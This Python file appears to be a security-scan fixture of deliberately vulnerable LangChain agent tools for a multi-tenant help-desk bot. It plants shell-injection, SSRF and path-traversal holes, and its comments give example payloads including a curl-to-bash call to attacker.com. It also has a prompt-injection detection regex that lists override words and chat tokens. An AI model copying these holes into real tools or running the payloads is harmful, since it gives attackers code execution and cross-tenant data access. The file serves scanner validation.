"""
Agent tool definitions.

SECURITY FIXTURE — This file contains deliberately insecure tool implementations
for use as a Trent scan validation fixture. Do NOT use this code in production.

Planted findings (application tier):
  VULN-APP-001: run_shell — RCE via shell=True with user-supplied command string
  VULN-APP-002: fetch_url — SSRF via user-supplied URL with no allowlist or redirect cap
  VULN-APP-003: read_file — path traversal via user-supplied path with no sandbox

The HelpDeskAI domain tools below wire the support agent into the tenant data layer
(src/data/*). They carry the multi-tenancy + database findings transitively — this is
what makes the agent able to reach tenant data, and what makes CHAIN-1 (chat
prompt-injection -> un-tenant-scoped lookup -> cross-tenant PII) concrete.
"""

import math
import re
import subprocess
import urllib.request
from langchain_core.tools import tool

from src.data.rds_client import RDSClient
from src.data.s3_client import S3Client
from src.data.dynamodb_client import DynamoDBClient


# ── Input validation for HelpDeskAI domain tools ─────────────────────────────

_ID_RE = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
_EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
MAX_REFUND_AMOUNT = 10_000.0
MAX_SUBJECT_LENGTH = 200
MAX_TICKET_BODY_LENGTH = 10_000
MAX_QUERY_PREFIX_LENGTH = 256


def _validate_id(value: str, name: str) -> str:
    if not isinstance(value, str) or not _ID_RE.fullmatch(value):
        raise ValueError(f"{name} must be 1-64 characters of letters, digits, '_' or '-'")
    return value


def _validate_refund_amount(amount: float) -> float:
    if isinstance(amount, bool) or not isinstance(amount, (int, float)):
        raise ValueError("amount must be a number")
    if not math.isfinite(amount) or amount <= 0 or amount > MAX_REFUND_AMOUNT:
        raise ValueError(f"amount must be greater than 0 and at most {MAX_REFUND_AMOUNT}")
    return float(amount)


def _validate_query_prefix(prefix: str) -> str:
    if (
        not isinstance(prefix, str)
        or len(prefix) > MAX_QUERY_PREFIX_LENGTH
        or prefix.startswith("/")
        or "\\" in prefix
        or "\x00" in prefix
        or ".." in prefix.split("/")
    ):
        raise ValueError("query_prefix must be a relative path prefix without '..' segments")
    return prefix


def _validate_text(value: str, name: str, max_length: int) -> str:
    if not isinstance(value, str) or not value.strip() or len(value) > max_length:
        raise ValueError(f"{name} must be non-blank and at most {max_length} characters")
    return value


_TASK_INJECTION_RE = re.compile(
    r"\b(system|instructions?|override|overrid(?:e|ing|den)|ignore|disregard|execute)\b"
    r"|[\r\n\x00]"
    r"|</?\s*(?:system|assistant|human|user)\s*>"
    r"|<\|[^|>]*\|>"
    r"|\[/?INST\]"
    r"|^\s*(?:system|assistant|human|user)\s*:",
    re.IGNORECASE,
)
MAX_TASK_LENGTH = 2_000


def _validate_task_no_injection(task: str) -> str:
    if not isinstance(task, str) or len(task) > MAX_TASK_LENGTH:
        raise ValueError(f"task must be a string of at most {MAX_TASK_LENGTH} characters")
    if _TASK_INJECTION_RE.search(task):
        raise ValueError("task contains disallowed instruction-override patterns")
    return task


@tool
def read_file(path: str) -> str:
    """Read the contents of a file at the given path and return them as a string.

    Args:
        path: Filesystem path to read. Relative or absolute.
    """
    # VULN-APP-003: No path validation. The caller can supply "../../../etc/passwd"
    # or any other path on the host filesystem. There is no chroot, no allow-list,
    # and no check that the path stays within the intended working directory.
    with open(path, "r") as f:
        return f.read()


@tool
def run_shell(command: str) -> str:
    """Run a shell command and return its combined stdout+stderr output.

    Args:
        command: The shell command to execute.
    """
    # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
    # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
    # gets arbitrary code execution on the host.
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout + result.stderr


@tool
def fetch_url(url: str) -> str:
    """Fetch the contents of a URL and return the response body as a string.

    Args:
        url: The URL to fetch. HTTP and HTTPS are supported.
    """
    # VULN-APP-002: No URL allowlist, no redirect cap, no IP range blocking.
    # An attacker can supply "http://169.254.169.254/latest/meta-data/" to reach
    # EC2 instance metadata, or "http://internal-service/" to reach services on
    # the agent's internal network (SSRF).
    with urllib.request.urlopen(url, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


# ── HelpDeskAI domain tools (operate on tenant data) ─────────────────────────

@tool
def lookup_order(order_id: str, tenant_id: str) -> dict:
    """Look up a customer order by its ID for the current tenant.

    Args:
        order_id: The order identifier to look up.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — order_id flows
    # straight from the agent (and thus from end-customer chat input) into
    # RDSClient.lookup_order, which builds raw f-string SQL with no tenant scoping.
    # A prompt-injected agent can read ANY tenant's order (CHAIN-1). tenant_id is
    # accepted but ignored by the underlying query.
    _validate_id(order_id, "order_id")
    _validate_id(tenant_id, "tenant_id")
    return RDSClient().lookup_order(order_id, tenant_id)


@tool
def issue_refund(order_id: str, amount: float, tenant_id: str) -> bool:
    """Issue a refund of `amount` against `order_id` for the current tenant.

    Args:
        order_id: The order to refund.
        amount: Refund amount.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — cross-tenant
    # write IDOR + SQLi reachable from the agent.
    _validate_id(order_id, "order_id")
    _validate_id(tenant_id, "tenant_id")
    amount = _validate_refund_amount(amount)
    return RDSClient().issue_refund(order_id, amount, tenant_id)


@tool
def search_kb(query_prefix: str, tenant_id: str) -> list:
    """Search the tenant knowledge base for documents matching a prefix.

    Args:
        query_prefix: Document key prefix to search.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-003 (transitive) — query_prefix flows into
    # S3Client.search_kb, which does not enforce a per-tenant prefix; "../other/"
    # reaches another tenant's KB.
    _validate_id(tenant_id, "tenant_id")
    _validate_query_prefix(query_prefix)
    return S3Client().search_kb(tenant_id, query_prefix)


@tool
def create_ticket(subject: str, body: str, customer_email: str, tenant_id: str) -> dict:
    """Create a support ticket for the current tenant.

    Args:
        subject: Ticket subject.
        body: Ticket body.
        customer_email: Customer's email.
        tenant_id: The current tenant context.
    """
    # Correctly tenant-scoped write (CTRL-DATA-001 lives in DynamoDBClient.create_ticket).
    _validate_id(tenant_id, "tenant_id")
    _validate_text(subject, "subject", MAX_SUBJECT_LENGTH)
    _validate_text(body, "body", MAX_TICKET_BODY_LENGTH)
    if not isinstance(customer_email, str) or len(customer_email) > 254 or not _EMAIL_RE.fullmatch(customer_email):
        raise ValueError("customer_email must be a valid email address")
    return DynamoDBClient().create_ticket(tenant_id, subject, body, customer_email)


@tool
def delegate_to_sub_agent(task: str) -> str:
    """Delegate a focused, self-contained sub-task to the task-executor sub-agent.

    Use this for multi-step research or escalation work that should run as its own
    ReAct loop (e.g. "investigate why order X keeps failing and summarize").

    Args:
        task: A self-contained description of the sub-task to execute.
    """
    task = _validate_task_no_injection(task)
    # Routing signal: the orchestrator graph routes to the `sub_agent` node when it
    # sees this tool call and runs the sub-agent with `task`. The return value here is
    # a placeholder — the sub-agent node produces the real result and answers this call.
    return "delegated"


# Tool registry — the orchestrator binds the ops tools, the domain tools, and the
# sub-agent delegation tool. The generic ops tools (read_file/run_shell/fetch_url) are
# internal/debug tools that should NOT be exposed to a customer-facing agent — their
# presence is itself a finding.
ALL_TOOLS = [
    read_file,
    run_shell,
    fetch_url,
    lookup_order,
    issue_refund,
    search_kb,
    create_ticket,
    delegate_to_sub_agent,
]

# Subset exposed to the sub-agent — intentionally excludes run_shell and the
# refund/ticket write tools to limit blast radius, but read tools remain (still risky).
SUB_AGENT_TOOLS = [read_file, fetch_url, lookup_order, search_kb]
